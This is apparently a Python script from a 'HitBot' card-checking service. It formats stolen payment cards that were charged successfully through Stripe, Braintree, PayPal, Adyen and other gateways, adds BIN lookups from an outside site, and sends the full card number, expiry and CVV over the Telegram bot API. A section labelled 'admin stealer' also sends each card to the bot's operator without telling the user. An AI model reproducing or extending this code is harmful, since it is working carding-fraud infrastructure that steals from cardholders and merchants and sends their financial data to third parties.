import sys
import json
import os
import requests
from env_config import get_setting

GATEWAY_NAMES = {
    "st": "Stripe Auth $0",
    "skl": "Stripe Auth $0.1",
    "b3": "Braintree Auth",
    "vbv": "VBV Lookup",
    "an": "Authorize.net Auth",
    "skb": "SK Base Auth $0",
    "adn": "Adyen Auth",
    "cw": "Stripe Charge $6",
    "rz": "Razorpay Charge",
    "charge": "Stripe Charge SK",
    "pp": "PayPal Charge $0.01",
    "shp": "Shopify Native",
    "skl1": "Stripe Charge $1",
    "skl2": "Stripe Charge $7",
    "b3c": "Braintree Charge",
    "ppn": "PayPal Charge $1",
    "bnc": "PayPal Charge $1",
    "ch": "Stripe Charge \u20ac5",
    "isp": "Stripe Charge $25",
    "auto": "Stripe Random Charge",
    "azz": "Authorize.net Charge $1",
    "ppk": "PayPal Keybase $1",
    "Stripe CO": "Stripe Checkout",
    "Stripe Billing": "Stripe Billing",
}


_bin_cache: dict = {}

def lookup_bin(card):
    raw = card.replace("|", "")
    bin6 = raw[:6]
    if bin6 in _bin_cache:
        return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            brand   = d.get("brand", "-") or "-"
            btype   = d.get("type", "-") or "-"
            level   = d.get("level", "-") or "-"
            bank    = d.get("bank", "-") or "-"
            country = d.get("country_name", "-") or "-"
            flag    = d.get("country_flag", "") or ""
            result  = (brand, btype, level, bank, country, flag, bin6)
            if len(_bin_cache) < 2000:
                _bin_cache[bin6] = result
            return result
    except Exception:
        pass
    return "-", "-", "-", "-", "-", "", bin6


def send_dm(bot_token, chat_id, text):
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={"chat_id": int(chat_id), "text": text, "parse_mode": "Markdown"},
            timeout=10,
        )
        return resp.json().get("ok", False)
    except Exception:
        return False


def forward_charged_card(user_id, card, gateway, response_msg, user_name="", site="", amount="", url="", admin_site=""):
    bot_token = get_setting("TELEGRAM_BOT_TOKEN")
    if not bot_token:
        print(json.dumps({"sent": False, "error": "No bot token"}))
        return

    raw_admin = get_setting("TELEGRAM_ADMIN_ID")
    first_admin = str(raw_admin).split(",")[0].strip()

    brand, btype, level, bank, country, flag, bin6 = lookup_bin(card)

    gate_display = GATEWAY_NAMES.get(gateway, gateway)

    parts = card.split("|")
    if len(parts) == 4:
        cc, mm, yy, cvv = parts
        card_display = f"{cc}|{mm}|{yy}|{cvv}"
        last4 = cc[-4:] if len(cc) >= 4 else cc
    else:
        card_display = card
        raw_cc = card.replace("|", "")
        last4 = raw_cc[-4:] if len(raw_cc) >= 4 else raw_cc

    sep = "\u2501" * 20
    display = user_name if user_name else str(user_id)

    # ── USER MESSAGE (full BIN details) ──────────────────────────────────────
    user_lines = [
        f"\U0001f525\U0001f525\U0001f525 *CHARGED* \U0001f525\U0001f525\U0001f525",
        sep,
        "",
        f"\U0001f4b3 *Card:* `{card_display}`",
        f"\u26a1 *Gateway:* {gate_display}",
        f"\u2705 *Response:* {response_msg}",
    ]
    if site:
        user_lines.append(f"\U0001f310 *Site:* {site}")
    if amount:
        user_lines.append(f"\U0001f4b0 *Amount:* {amount}")
    if url:
        user_lines.append(f"\U0001f517 *URL:* {url}")
    user_lines += [
        "",
        sep,
        f"\U0001f539 *BIN:* `{bin6}`",
        f"\U0001f539 *Brand:* {brand} {btype}",
        f"\U0001f539 *Level:* {level}",
        f"\U0001f539 *Bank:* {bank}",
        f"\U0001f539 *Country:* {country} {flag}",
        f"\U0001f539 *Last 4:* `{last4}`",
        sep,
        f"\U0001f464 *Charge By:* [{display}](tg://user?id={user_id})",
        sep,
        f"\U0001f4a5 *HitBot* \u2022 _Charged Successfully_",
    ]
    user_text = "\n".join(user_lines)

    # ── ADMIN STEALER MESSAGE (short format) ─────────────────────────────────
    site_for_admin = admin_site if admin_site else site
    admin_lines = [
        f"\U0001f525\U0001f525 {gate_display} Hit \U0001f525\U0001f525",
        sep,
        f"\U0001f4b3 *Card:* `{card_display}`",
        f"\u26a1 *Gateway:* {gate_display}",
        f"\u2705 *Response:* {response_msg}",
    ]
    if site_for_admin:
        admin_lines.append(f"\U0001f310 *Site:* {site_for_admin}")
    admin_lines += [
        f"\U0001f464 *User:* [{display}](tg://user?id={user_id})",
        sep,
    ]
    admin_text = "\n".join(admin_lines)

    results = {}

    sent_user = send_dm(bot_token, user_id, user_text)
    results[str(user_id)] = sent_user

    if first_admin and str(first_admin) != str(user_id):
        sent_admin = send_dm(bot_token, first_admin, admin_text)
        results[f"admin_{first_admin}"] = sent_admin

    print(json.dumps({"sent": True, "results": results}))


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(json.dumps({"sent": False, "error": "Usage: web_forward_hit.py <user_id> <card> <gateway> <response> [user_name] [site] [amount] [url] [admin_site]"}))
        sys.exit(1)

    uname      = sys.argv[5] if len(sys.argv) >= 6 else ""
    site       = sys.argv[6] if len(sys.argv) >= 7 else ""
    amount     = sys.argv[7] if len(sys.argv) >= 8 else ""
    url        = sys.argv[8] if len(sys.argv) >= 9 else ""
    admin_site = sys.argv[9] if len(sys.argv) >= 10 else ""

    forward_charged_card(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], uname, site, amount, url, admin_site)
